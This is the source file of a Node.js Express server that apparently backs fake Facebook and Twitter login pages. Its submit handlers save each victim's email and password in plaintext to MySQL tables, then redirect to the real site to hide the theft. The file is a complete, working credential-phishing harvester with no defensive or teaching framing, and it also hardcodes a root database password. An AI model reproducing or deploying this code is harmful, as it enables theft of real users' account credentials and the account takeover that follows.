const express = require('express');
const app = express();
const mysql = require('mysql');
const port = 5000;
const bodyParser = require('body-parser')
const connection = mysql.createConnection({
    host: '127.0.0.1',
    user: 'root',
    password: '2003',
    database: 'Facebook_Twitter'
});
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
function createConnection(){
    connection.connect((err)=>{
        if(err){
            console.log(err);
        }
        console.log('Connection Successfully Made')
    })

}

app.get('/facebook', (req, res)=>{
    res.sendFile(__dirname+'/public/index.html');
})

app.post('/facebooksubmit', (req, res)=>{
try{
    const email = req.body.email;
    const password = req.body.password;
    const values = {
        username : email,
        password : password,
    }
    connection.query('INSERT INTO facebook SET ?', values, (err)=>{
        if(err){
            console.log(err);
        }else{
            console.log('Data Inserted Successfully!')
        }
    })
    res.redirect('https://www.facebook.com');
}catch(error){
       res.send('Error During Processing!');
       console.log('Error while catch block!')
}
});


app.get('/twitter', (req, res)=>{
    res.sendFile(__dirname+'/public/twitter.html');
})

app.post('/twittersubmit', (req, res)=>{
try{
    const email = req.body.email;
    const password = req.body.password;
    const values = {
        username : email,
        password : password,
    }
    connection.query('INSERT INTO twitter SET ?', values, (err)=>{
        if(err){
            console.log(err);
        }else{
            console.log('Data Inserted Successfully!')
        }
    })
    res.redirect('https://www.twitter.com');
}catch(error){
       res.send('Error During Processing!');
       console.log('Error while catch block!')
}
});


app.listen(port , ()=>{
    console.log('Server is now live at',port);
    createConnection();
})